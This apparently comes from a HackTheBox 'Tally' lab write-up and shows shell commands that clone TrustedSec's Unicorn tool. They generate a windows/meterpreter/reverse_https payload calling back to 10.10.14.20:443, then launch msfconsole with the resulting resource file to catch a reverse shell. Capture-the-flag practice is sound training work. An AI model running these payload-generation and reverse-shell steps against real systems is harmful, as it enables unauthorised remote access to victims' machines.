@@ -1,0 +1,8 @@
+cd /opt 
+sudo git clone https://github.com/trustedsec/unicorn.git
+cp -r  unicorn ~/htb/tally 
+cd !$
+┌─[user@parrot-virtual]─[~/htb/tally/unicorn]
+└──╼ $python unicorn.py windows/meterpreter/reverse_https 10.10.14.20 443
+┌─[user@parrot-virtual]─[~/htb/tally/unicorn]
+└──╼ $sudo msfconsole -r unicorn.rc
